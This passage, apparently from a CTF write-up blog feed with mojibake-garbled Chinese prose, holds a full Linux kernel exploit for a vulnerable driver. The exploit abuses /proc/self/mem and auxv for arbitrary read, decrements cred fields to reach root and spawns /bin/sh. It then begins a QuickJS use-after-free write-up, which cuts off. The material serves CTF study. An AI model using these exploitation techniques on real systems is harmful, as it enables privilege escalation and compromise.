&amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, %d, %d, %lx\n&quot;</span>,i, j, fd_tmp, addr);<br>&#125;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray over.&quot;</span>);<br><br><span class="hljs-keyword">for</span>(i=N_PAGE_NUM<span class="hljs-number">-3</span>; i&lt;N_PAGE_NUM; i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x22</span>; j++)&#123;<br>sprays[i][j].addr = sprays[i-(N_PAGE_NUM<span class="hljs-number">-3</span>)][j].addr;<br>dev_write(fd, sprays[i][j].fd, sprays[i][j].addr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, %d, %d, %lx\n&quot;</span>,i, j, sprays[i][j].fd, sprays[i][j].addr);<br>&#125;<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write over.&quot;</span>);<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;N_PAGE_NUM<span class="hljs-number">-3</span>; i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x22</span>; j++)&#123;<br>close(sprays[i][j].fd);<br>&#125;<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Close over.&quot;</span>);<br><br><span class="hljs-type">size_t</span> *ptr = (<span class="hljs-type">size_t</span> *)buffer;<br>ptr[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span>;<br>ptr[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">3</span>] = <span class="hljs-number">0x2000</span>;<br>ptr[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">6</span>] = <span class="hljs-number">8</span>;<br>ptr[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">9</span>] = <span class="hljs-number">0xdeadbeef</span>; <span class="hljs-comment">// self + 0x48</span><br>ptr[<span class="hljs-number">10</span>] = <span class="hljs-number">0xdeadbeef</span>; <span class="hljs-comment">// self + 0x48 </span><br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x22</span>; i++)&#123;<br><span class="hljs-keyword">if</span>((sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>ptr[<span class="hljs-number">9</span>] = sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr + <span class="hljs-number">0x48</span>;<br>ptr[<span class="hljs-number">10</span>] = sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr + <span class="hljs-number">0x48</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find target %lx.\n&quot;</span>, sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br><br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;N_PAGES; j++)&#123;<br>write(pipe_fd[j][<span class="hljs-number">1</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>&#125;<br>read(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].fd, &amp;kernel_base, <span class="hljs-number">8</span>);<br>kernel_base -= <span class="hljs-number">0x22bf70</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, kernel_base);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br>read(pipe_fd[i][<span class="hljs-number">0</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>&#125;<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x22</span>; i++)&#123;<br><span class="hljs-keyword">if</span>((sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find target %lx.\n&quot;</span>, sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br>hack(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br>read(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].fd, &amp;kernel_base, <span class="hljs-number">8</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h1><p><em><strong>å¹½å¤©å¸ï¼\(^o^)&#x2F; å¹½å¤©å¸ï¼\(^o^)&#x2F; å¹½å¤©å¸ï¼\(^o^)&#x2F;</strong></em></p><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p><code>/proc/self</code>ä¸‹å…¶å®è¿˜æœ‰å…¶ä»–èƒ½ç”¨çš„æ–‡ä»¶ï¼š</p><ul><li><code>/proc/self/mem</code>ï¼šè¿›ç¨‹è™šæ‹Ÿå†…å­˜è¯»å†™</li><li><code>/proc/self/auxv</code>ï¼šè¯»è¿›ç¨‹è¾…åŠ©å‘é‡</li></ul><p>è¿™ä¸¤ä¸ªæ–‡ä»¶<code>file-&gt;private_data</code>éƒ½æŒ‡å‘è¿›ç¨‹çš„mm_struct</p><ul><li><p>è¯»<code>/proc/self/auxv</code>ç­‰åŒäºè¯»mm_structçš„æŸå—å†…å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>    <span class="hljs-comment">// â€¦â€¦</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="hljs-comment">/* for /proc/PID/auxv */</span><br>    <span class="hljs-comment">// â€¦â€¦</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>closeä¸€ä¸ª<code>/proc/self/mem</code>ä¼šè°ƒç”¨mmdropï¼Œä¹Ÿå°±æ˜¯mm_count-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">atomic_t</span> mm_count;<br>&#125; ____cacheline_aligned_in_smp;<br>        <span class="hljs-comment">// â€¦â€¦</span><br></code></pre></td></tr></table></figure></li></ul><p>ç”±äºå¯ä»¥éšä¾¿æ”¹file-&gt;private_dataï¼Œæ‰€ä»¥é€šè¿‡closeä¸€ä¸ª<code>/proc/self/mem</code>å¯ä»¥è·å¾—ä»»æ„åœ°å€å†…å®¹-1åŸè¯­ï¼Œé€šè¿‡è¯»<code>/proc/self/auxv</code>å¯ä»¥è·å¾—ä»»æ„è¯»åŸè¯­</p><p>ç”±äºå¼€å¯äº†usercopyä¿æŠ¤ï¼Œå®é™…ä¸Šä¸èƒ½è¿›è¡Œå †ä¸Šä»»æ„çš„è¯»å†™ï¼Œå¯ä»¥é€šè¿‡-1åŸè¯­æ›´æ”¹kmem_cache-&gt;useroffsetå’Œkmem_cache-&gt;usersizeè¿›è¡Œä¸€ä¸ªç»•è¿‡</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_READ    0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_WRITE   0x1338</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">long</span> val;<br>&#125; <span class="hljs-type">req_t</span>;<br><br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">dev_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = <span class="hljs-number">0</span>,<br>&#125;;<br>ioctl(fd_dev, CMD_READ, &amp;arg);<br><span class="hljs-keyword">return</span> arg.val;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dev_write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> val)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = val,<br>&#125;;<br><span class="hljs-keyword">return</span> ioctl(fd_dev, CMD_WRITE, &amp;arg);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd_addr</span> &#123;</span><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">size_t</span> addr;<br>&#125; object;<br><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_read_offset</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd_auxv, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">size_t</span> offset)</span> &#123;<br>dev_write(fd_dev, fd_auxv, addr<span class="hljs-number">-0x198</span>+offset);<br>lseek(fd_auxv, <span class="hljs-number">0</span>, SEEK_SET);<br>read(fd_auxv, buffer+offset, <span class="hljs-number">0x100</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">arbitary_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd_auxv, <span class="hljs-type">size_t</span> addr)</span> &#123;<br>dev_write(fd_dev, fd_auxv, addr<span class="hljs-number">-0x198</span>);<br>lseek(fd_auxv, <span class="hljs-number">0</span>, SEEK_SET);<br>read(fd_auxv, buffer, <span class="hljs-number">0x1000</span>);<br><span class="hljs-keyword">return</span> *(<span class="hljs-type">size_t</span> *)buffer;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_sub1</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">size_t</span> addr)</span> &#123;<br><span class="hljs-type">int</span> fd_mem = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>dev_write(fd_dev, fd_mem, addr);<br>close(fd_mem);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_FD_MEM 0x300</span><br><span class="hljs-type">int</span> fd_mems[N_FD_MEM];<br><span class="hljs-type">int</span> fd_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_fds</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_FD_MEM; i++) &#123;<br>fd_mems[i] = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br><span class="hljs-keyword">if</span>(fd_mems[i]&lt;<span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open /proc/self/mem failed at %d\n&quot;</span>, i);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_subn</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">int</span> n)</span> &#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;n; i++)&#123;<br>dev_write(fd_dev, fd_mems[fd_idx], addr);<br>close(fd_mems[fd_idx]);<br>fd_idx++;<br>&#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>save_status();<br>bind_core(<span class="hljs-number">0</span>);<br><br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, O_RDWR);<br><br><span class="hljs-type">int</span> fd_auxv = open(<span class="hljs-string">&quot;/proc/self/auxv&quot;</span>, O_RDONLY);<br><br><span class="hljs-type">size_t</span> heap_addr = dev_read(fd, fd_auxv);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap_addr: %lx\n&quot;</span>, heap_addr);<br><br>kernel_base = arbitary_read(fd, fd_auxv, (heap_addr&amp;<span class="hljs-number">0xfffffffff0000000</span>)+<span class="hljs-number">0x9d000</span>)<span class="hljs-number">-0x22bf70</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, kernel_base);<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK 0xe0c480</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TASK_STRUCT_CACHE0x10eeb98</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_CACHE0x10efaf0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TASKS_OFFSET0x320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMM_OFFSET0x5d0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USEROFFSET_OFFSET0xc8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USERSIZE_OFFSET0xcc</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_OFFSET0x5c8</span><br><br><span class="hljs-type">size_t</span> task_struct_cache = arbitary_read(fd, fd_auxv, kernel_base+TASK_STRUCT_CACHE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;task_struct_cache: %lx\n&quot;</span>, task_struct_cache);<br><br><span class="hljs-type">size_t</span> cred_cache = arbitary_read(fd, fd_auxv, kernel_base+CRED_CACHE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred_cache: %lx\n&quot;</span>, cred_cache);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0xa40</span><span class="hljs-number">-0x320</span>; i++)<br>arbitary_sub1(fd, task_struct_cache+USEROFFSET_OFFSET);<br>arbitary_sub1(fd, task_struct_cache+USERSIZE_OFFSET+<span class="hljs-number">2</span>);<br><br>arbitary_sub1(fd, cred_cache+USERSIZE_OFFSET);<br><br><span class="hljs-type">size_t</span> next_task = kernel_base+INIT_TASK;<br><span class="hljs-keyword">do</span> &#123;<br>next_task = arbitary_read(fd, fd_auxv, next_task+TASKS_OFFSET+<span class="hljs-number">8</span>)-TASKS_OFFSET;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;next_task: %lx\n&quot;</span>, next_task);<br>arbitary_read(fd, fd_auxv, next_task+COMM_OFFSET);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;task_struct-&gt;comm: %s\n&quot;</span>, buffer);<br><br>&#125; <span class="hljs-keyword">while</span>(<span class="hljs-built_in">strncmp</span>(buffer, <span class="hljs-string">&quot;exploit&quot;</span>, <span class="hljs-number">7</span>));<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got it %lx!\n&quot;</span>, next_task);<br><span class="hljs-type">size_t</span> cred = arbitary_read(fd, fd_auxv, next_task+CRED_OFFSET);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred: %lx\n&quot;</span>, cred);<br><br>arbitary_read(fd, fd_auxv, cred+<span class="hljs-number">8</span>);<br>prepare_fds();<br><span class="hljs-type">uint8_t</span> *ptr = buffer;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x20</span>; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;round %d\n&quot;</span>, i);<br>hex_dump(ptr, <span class="hljs-number">0x20</span>);<br><span class="hljs-keyword">if</span> ((*((<span class="hljs-type">uint32_t</span> *)(&amp;ptr[i]))&amp;<span class="hljs-number">0xffffff00</span>) == <span class="hljs-number">0</span>) &#123;<br>arbitary_subn(fd, cred+<span class="hljs-number">8</span>+i+<span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br>arbitary_read_offset(fd, fd_auxv, cred+<span class="hljs-number">8</span>, i);<br>&#125;<br>arbitary_subn(fd, cred+<span class="hljs-number">8</span>+i, ptr[i]);<br><br>arbitary_read_offset(fd, fd_auxv, cred+<span class="hljs-number">8</span>, i);<br>&#125;<br><br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>sleep(<span class="hljs-number">10000</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 ASIS CTF RandomJS wp</title>
    <link href="/2025/09/13/asis2025qjs/"/>
    <url>/2025/09/13/asis2025qjs/</url>
    
    <content type="html"><![CDATA[<p>:)</p><span id="more"></span><h1 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h1><p>ç»™arrayåŠ äº†ä¸ªæ–¹æ³•ï¼Œåœ¨arrayä¸­ä»»æ„é€‰æ‹©ä¸€ä¸ªobjè¿”å›ï¼Œä½†æ²¡æœ‰å¢åŠ refcountï¼Œå¯ä»¥uaf</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> JSValue <span class="hljs-title">js_array_randompick</span><span class="hljs-params">(JSContext *ctx, JSValueConst this_val,</span></span><br><span class="hljs-params"><span class="hljs-function">                           <span class="hljs-type">int</span> argc, JSValueConst *argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    JSValue obj, ret;<br>    <span class="hljs-type">int64_t</span> len, idx;<br>    JSValue *arrp;<br>    <span class="hljs-type">uint32_t</span> count;<br><br>    obj = <span class="hljs-built_in">JS_ToObject</span>(ctx, this_val);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">js_get_length64</span>(ctx, &amp;len, obj))<br>        <span class="hljs-keyword">goto</span> exception;<br><br>    idx = <span class="hljs-built_in">rand</span>() % len;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">js_get_fast_array</span>(ctx, obj, &amp;arrp, &amp;count) &amp;&amp; idx &lt; count) ret = (JSValue) arrp[idx];<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> present = <span class="hljs-built_in">JS_TryGetPropertyInt64</span>(ctx, obj, idx, &amp;ret);<br>        <span class="hljs-keyword">if</span> (present &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> exception;<br>        <span class="hljs-keyword">if</span> (!present)<br>            ret = JS_UNDEFINED;<br>    &#125;<br>    <span class="hljs-built_in">JS_FreeValue</span>(ctx, obj);<br>    <span class="hljs-keyword">return</span> ret;<br> exception:<br>    <span class="hljs-built_in">JS_FreeValue</span>(ctx, obj);<br>    <span class="hljs-keyword">return</span> JS_EXCEPTION;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç›®æ ‡å¯¹è±¡"><a href="#ç›®æ ‡å¯¹è±¡" class="headerlink" title="ç›®æ ‡å¯¹è±¡"></a>ç›®æ ‡å¯¹è±¡</h1><p>jsè§£é‡Šå™¨çš„é¢˜å¯ä»¥é€šè¿‡è¿™ç§ğŸ‘‡æ–¹å¼è¿›è¡Œä»»æ„è¯»å†™ã€‚ç”¨ArrayBuffer-&gt;bufå ä½uaf objï¼Œç„¶åé€šè¿‡BigUint64Arrayç­‰è§†å›¾è¯»å†™objç»“æ„ä½“ï¼Œæ§åˆ¶bufæŒ‡å‘ç›®æ ‡è¯»å†™åœ°å€è¿›è¡Œä»»æ„è¯»å†™</p><img src="/2025/09/13/asis2025qjs/uaf.png" class title="uaf"><p>ä½†åœ¨è¿™é“é¢˜çš„æƒ…å†µä¸‹ï¼Œéœ€è¦å…ˆé€šè¿‡randompickæ–¹æ³•free objå†åˆ†é…ç»™ArrayBuffer-&gt;bufï¼Œå†åˆ†é…çš„æ—¶å€™objå·²ç»è¢«æ¸…ç©ºäº†ï¼Œæ— æ³•leakåœ°å€</p><p>æˆ‘æœ€å¼€å§‹æƒ³é€šè¿‡æ™®é€šçš„arrayæ¥å ä½uaf objï¼Œç±»ä¼¼è¿™æ ·ï¼ˆç”¨-1æ ‡è®°objï¼Œ7æ ‡è®°æ•´æ•°ï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">target = [&#123;&#125;, <span class="hljs-number">0xdeadbeefn</span>, &#123;&#125;]<br><br><span class="hljs-comment">// tele target</span><br><span class="hljs-comment">// +0x0 0xffffffffffffffff</span><br><span class="hljs-comment">// +0x8 0x55555564a890</span><br><span class="hljs-comment">// +0x100x7</span><br><span class="hljs-comment">// +0x180xdeadbeef</span><br><span class="hljs-comment">// +0x200xffffffffffffffff</span><br><span class="hljs-comment">// +0x280x55555564b560</span><br></code></pre></td></tr></table></figure><p><em>ä½†æ™®é€šçš„arrayæ˜¯ç”¨reallocç”³è¯·ç©ºé—´çš„ï¼Œä¸å¥½å ä½â€¦â€¦</em></p><p>åæ¥é€šè¿‡discordçš„expå‘ç°äº†è¿™ä¹ˆä¸€ä¸ªç»“æ„ä½“ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">JSBigInt</span> &#123;<br>    JSRefCountHeader header; <span class="hljs-comment">/* must come first, 32-bit */</span><br>    <span class="hljs-type">uint32_t</span> len; <span class="hljs-comment">/* number of limbs, &gt;= 1 */</span><br>    <span class="hljs-type">js_limb_t</span> tab[]; <span class="hljs-comment">/* two&#x27;s complement representation, always</span><br><span class="hljs-comment">                        normalized so that &#x27;len&#x27; is the minimum</span><br><span class="hljs-comment">                        possible length &gt;= 1 */</span><br>&#125; JSBigInt;<br></code></pre></td></tr></table></figure><p>åœ¨ä¸€ä¸ªæ•°å­—åæ ‡è®°nè¡¨ç¤ºä¸€ä¸ªå¤§æ•´æ•°ï¼Œå¤§äº4å­—èŠ‚çš„æ•´æ•°ç”¨è¿™æ ·ä¸€ä¸ªç»“æ„ä½“ğŸ‘†è¡¨ç¤ºï¼Œquickjsçš„å¤§æ•´æ•°æ˜¯ä¸é™é•¿åº¦çš„ï¼ŒJSBigInt-&gt;lenè¡¨ç¤ºå¤§æ•´æ•°çš„é•¿åº¦ï¼ˆå•ä½bitï¼‰ï¼Œæ”¹å¤§lenå°±èƒ½è¶Šç•Œè¯»äº†ï¼›ä¸”æ•´ä¸ªç»“æ„ä½“æ²¡æœ‰æŒ‡é’ˆï¼Œéå¸¸å®Œç¾~</p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>é€‰æ‹©JSBigIntä½œä¸ºuaf objï¼Œæ”¹å¤§lenè¶Šç•Œè¯»å†™æ³„æ¼åœ°å€ï¼Œç„¶åå†uafä¸€æ¬¡ä¼ªé€ objè¿›è¡Œä»»æ„è¯»å†™</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 